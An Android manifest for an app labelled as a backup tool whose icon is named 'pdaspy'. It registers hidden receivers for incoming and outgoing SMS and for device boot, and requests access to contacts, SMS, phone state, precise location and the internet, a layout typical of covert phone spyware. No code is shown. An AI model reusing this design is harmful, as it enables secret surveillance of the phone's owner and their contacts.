<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.spinXbackup.backupApp">
    <application android:icon="@drawable/pdaspy" android:label="@string/app_name">
        <activity android:label="@string/app_name" android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/app_name" android:name=".ChooseAccountActivity"/>
        <activity android:label="@string/app_name" android:name=".UseExistingAccountActivity"/>
        <activity android:label="@string/app_name" android:name=".OpenNewAccountActivity"/>
        <activity android:label="@string/app_name" android:name="com.spinXbackup.backupApp.ConfigClient"/>
        <service android:name="com.spinXbackup.backupApp.LogService"/>
        <service android:name="com.spinXbackup.backupApp.ServiceController"/>
        <receiver android:enabled="true" android:exported="false" android:name="com.spinXbackup.backupApp.LogService">
            <intent-filter>
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
            </intent-filter>
        </receiver>
        <receiver android:enabled="true" android:exported="false" android:name="com.spinXbackup.backupApp.LogService">
            <intent-filter>
                <action android:name="android.provider.Telephony.SMS_SENT"/>
            </intent-filter>
        </receiver>
        <receiver android:enabled="true" android:exported="false" android:name="com.spinXbackup.backupApp.LogServiceManager">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
</manifest>